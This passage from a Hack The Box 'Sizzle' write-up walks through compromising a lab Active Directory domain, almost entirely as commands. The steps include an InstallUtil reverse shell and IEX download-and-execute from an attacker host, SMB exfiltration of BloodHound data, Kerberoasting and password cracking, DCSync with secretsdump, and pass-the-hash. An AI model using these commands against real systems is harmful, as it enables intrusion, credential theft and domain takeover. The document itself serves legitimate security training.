> **Victime Machine**:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.2 /rport=443 /U C:\Windows\Temp\privesc\PsBypassCLM.exe
# :( ??
```

> **Attacker Machine**:

```bash
git clone https://github.com/padovah4ck/PSByPassCLM
cd ./PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/debug
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.2/PsBypassCLM.exe -OutFile .\PsBypassCLM.exe
```

> **Attacker Machine**:

```bash
rlwrap nc -nlvp 443
```

> **Victime Machine**:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.2 /rport=443 /U C:\Windows\Temp\privesc\PsBypassCLM.exe
# :)

whoami
hostname
$ExecutionContext.SessionState.LanguageMode
# FullLanguage        :)
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
cat SharpHound.ps1 | grep -i invoke
# PS C:\> Invoke-BloodHound -CollectionMethods All
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/SharpHound.ps1')
# :(
iwr -uri http://10.10.14.2/SharpHound.ps1 -OutFile ./SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethods All
# :(
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.2/SharpHound.exe -OutFile ./SharpHound.exe
.\SharpHound.exe -c all --ldapusername amanda --ldappassword A...2
# .Net Runtime is not compatible with SharpHound  :(
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can perform a remote collection of information from the **AD** with `bloodhound-python` which does work and I can load and process it with **BloodHound**, but I still had a question why the `SharpHound.ps1` collector did not work for me so I get an even older version and this time I succeed in generating the compressed file of the collected information that I can transfer to my machine, after starting an **SMB server** with `impacket-smbserver`.

> **Attacker Machine**:

```bash
bloodhound-python -u amanda -p Ashare1972 -ns 10.10.10.103 -d htb.local -c All --zip

# http://127.0.0.1:8080/ui/explore

python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy 20250628205548_BloodHound.zip \\10.10.14.2\smbFolder\20250628205548_BloodHound.zip
```

> **Attacker Machine**:

```bash
# Or:
impacket-smbserver smbFolder $(pwd) -smb2support -username oldboy -password oldb0yHello
```

> **Victime Machine**:

```cmd
net use x: \\10.10.14.2\smbFolder /u:oldboy oldb0yHello
dir x:\

copy 20250628205548_BloodHound.zip x:\bloodhoun.zip
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start my research with **BloodHound**, the first thing I find is that only two accounts are part of the **Domain Admins** group. Before I continue I will look for the account I already have engaged and add it as **owned**, now I can continue and look for the shortest path to the **Domain Admins**, the groups to which **amanda's** account belongs, without finding much for the moment. But if I look for those **[Kerberoastable](https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html){:target="_blank"}** accounts, I find **mrlky's**, maybe it is a possible attack vector.

> **Kerberoasting** is a **post-exploitation attack technique** targeting the **Kerberos** authentication protocol, enabling adversaries to extract encrypted service account credentials from **Active Directory**.

> **[Kerberoasting Attack](https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html){:target="_blank"}**: The adversary then requests **Kerberos ticket granting service** (**TGS**) tickets for the service accounts and extracts the password hashes from memory. Tools such as **Rubeus** fully automate the process.

```html
# http://127.0.0.1:8080/ui/explore
# All Domain Admins
# Shortest paths to Domain Admins                     :(
# Shortest paths from Owned objects                   :(
# All Kerberoastable users --> MRLKY@HTB.LOCAL        :) I can impersonate the MRLKY account ?
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_82.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_83.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_84.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_85.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_86.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_87.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the information that **mrlky's account** is **Kerberoastable**, I'm going to use the `rubeus.exe` tool from **[r3motecontrol](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries){:target="_blank"}**, so I download the binary from the **Github** repository and transfer it to the target machine. Performing the attack with **amanda's** account credentials I get the **hash** of **mrlky's password** from **memory**. The next thing I need to do is crack the password with a brute force attack with `john` to get the same in clear text. I validate with `crackmapexec` that the credentials are valid and as expected, I will have to request again a certificate to connect using the **WinRM** protocol (remembering that I must generate a **CSR** and then make the request via web).

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/Rubeus.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.2/Rubeus.exe -OutFile .\Rubeus.exe
.\Rubeus.exe kerberoast /creduser:HTB.LOCAL\amanda /credpassword:A...2
```

> **Attacker Machine**:

```bash
nvim mrlky_hash
cat !$

john -w=$(locate rockyou.txt)                                 [Tab]
john -w=/usr/share/wordlists/rockyou.txt mrlky_hash
crackmapexec smb 10.10.10.103 -u 'mrlky' -p 'F...'
crackmapexec winrm 10.10.10.103 -u 'mrlky' -p 'F...7'

evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'A...2'
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_88.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_89.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_90.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_91.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_92.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_93.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the newly obtained credentials, I can connect through my browser to the **AD Certificate Service** to attach the **CSR** (generated with `openssl`) and make a request for a new certificate, but this time for the user **mrlky**. Once downloaded to my machine I succeed to connect with `evil-winrm` to the target machine.

```bash
openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr
ls mrlky*
cat mrly.csr | xclip -sel clip
# https://sizzle.htb.local/certsrv/

mv /home/al3j0/Downloads/certnew.cer ./certnew_mrlky.cer
evil-winrm -S -c certnew_mrlky.cer -k mrlky.key -i 10.10.10.103 -u 'mrlky' -p 'F...7'
# :)
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_94.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_95.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_96.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_97.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the new account compromised I can again investigate with **BloodHound** the information collected from the **DC** and look for an attack vector to **Escalate Privileges**, but this time I add **mrlky's** account as **owned**, and after a while of searching I find the possible vector through the **Incoming Object Control** in the **AD**. Because I have the **GetChanges** and **GetChanesAll** privileges (<ins>I need both</ins>), I can perform a **[DCSync attack](https://www.semperis.com/blog/dcsync-attack/){:target="_blank"}** and get the password hashes of the **AD** accounts. With `impacket-secretsdump` I perform the attack and succeed in leaking all the hashes, including the **Administrator's**, so with `impacket-wmiexec` I can perform a **PassTheHash attack** and access with the account of maximum privileges to see the content of the two flags that I must enter in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**. **Machine pwned**.

> **GetChanges** (Windows Abuse): with both **GetChanges** and **GetChangesAll** privileges in **BloodHound**, you may perform a **DCSync attack** to get the password hash of an arbitrary principal using **mimikatz**.

> A **[DCSync attack](https://www.semperis.com/blog/dcsync-attack/){:target="_blank"}** is an attack technique that is typically used to steal credentials from an **AD database**. The attacker impersonates a **Domain Controller** (**DC**) to request password hashes from a target **DC**, using the **Directory Replication Services** (**DRS**) **Remote Protocol**. The attack can be used to effectively **“pull”** password hashes from the **DC*+, without needing to run code on the **DC** itself. This type of attack is adept at bypassing traditional auditing and detection methods. 

- Note that the attacker must first gain access to an account with high-level permissions, such as **Domain Admin** or an account with the ability to replicate data from the **DC**. This action requires the following permissions on the Domain Naming Context:
  - Replicate Directory Changes
  - Replicate Directory Changes All

> **Attacker Machine**:

```bash
# http://127.0.0.1:8080/ui/explore
# Outbound Object Control --> HTB.LOCAL (GetChanges,GetChangesAll,GetChangesInFilteredSet)

impacket-secretsdump htb.local/mrlky:F...7@10.10.10.103
# :)
impacket-wmiexec HTB.LOCAL/Administrator@10.10.10.103 -hashes :f6...67
# :)
```

> **Victime Machine**:

```cmd
dir /s user.txt
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_98.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_99.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_103.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_104.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is also possible to **Escalate Privileges** through the **Kerberos** protocol, but using **Port Forwarding** with **[chisel](https://github.com/jpillora/chisel){:target="_blank"}**. I just need to download the latest version of `chisel` and a deprecated version of `chisel.exe` (because the **OS version** of the **AD** is old), then I must transfer the latter to the victim machine to create the tunnel from port **88** on my machine to port **88** on the target. First I will try to perform a brute force attack (with the list of **AD** users and indicating that the **IP** of the **DC** is the **localhost**) to get a **TGT** of those accounts that do **Not require Kerberos pre-authentication** with `impacket-GetUNPUsers`, but I have no luck. The next thing I try is to use `impacket-GetUserSPNs` to get some ticket from some **SPN** that will allow me to crack later with `john`. The first time I run the command it doesn't work because I also need to create a tunnel to **LDAP** port **389** and I already succeed to get the Ticket that is going to help me to re-engage the box. Now I just need to clean up my **Docker** environment.

> **[Impacket’s GetUserSPNs.py](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/){:target="_blank"}** will attempt to fetch **Service Principal Names** that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.

> In **Windows** environments, a **Service Principal Name** (**SPN**) is a **unique identifier** that links a service instance to a service logon account, allowing clients to authenticate and connect to the correct service within **Active Directory**. Essentially, it's how a service tells the **Kerberos authentication system**, "This is who I am."

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/chisel_1.* .
gunzip chisel_1.10.1_linux_amd64.gz &>/dev/null
gunzip chisel_1.7.5_windows_amd64.gz &>/dev/null
mv chisel_1.10.1_linux_amd64 chisel
mv chisel_1.7.5_windows_amd64 chisel.exe
chmod +x chisel
./chisel

python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.2/chisel.exe -OutFile .\chisel.exe
.\chisel.exe
```

> **Attacker Machine**:

```bash
./chisel server --reverse -p 1234
```

> **Victime Machine**:

```cmd
.\chisel.exe client 10.10.14.2:1234 R:88:127.0.0.1:88
```

> **Attacker Machine**:

```bash
lsof -i:88

impacket-GetNPUsers htb.local/ -no-pass -usersfile users
impacket-GetNPUsers htb.local/ -no-pass -usersfile users -dc-ip 127.0.0.1

impacket-GetUserSPNs --help
impacket-GetUserSPNs htb.local/amanda:A...2 -request -dc-ip 127.0.0.1
# Connection refused :(
```

> **Victime Machine**:

```cmd
.\chisel.exe client 10.10.14.2:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
```

> **Attacker Machine**:

```bash
lsof -i:389

impacket-GetUserSPNs htb.local/amanda:A...2 -request -dc-ip 127.0.0.1
# :)
rdate -n 10.10.10.103
impacket-GetUserSPNs htb.local/amanda:A...2 -request -dc-ip 127.0.0.1
# :)

docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
docker volume rm $(docker volume ls -q)
docker network rm $(docker network ls -q)
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_105.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_106.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_107.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_108.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_109.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_110.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_111.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_112.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Great **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, from which I learned many concepts that often appear in an **Active Directory** environment. My goal is always to keep growing professionally and unquestionably the best tool to achieve it has been and still is the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs, because every time I face them they show me that they have been created by people who invest a lot of time in their configuration, besides sharing all their knowledge with the community through them. It is time to kill the box to continue with the next one.

<br /><br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_113.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
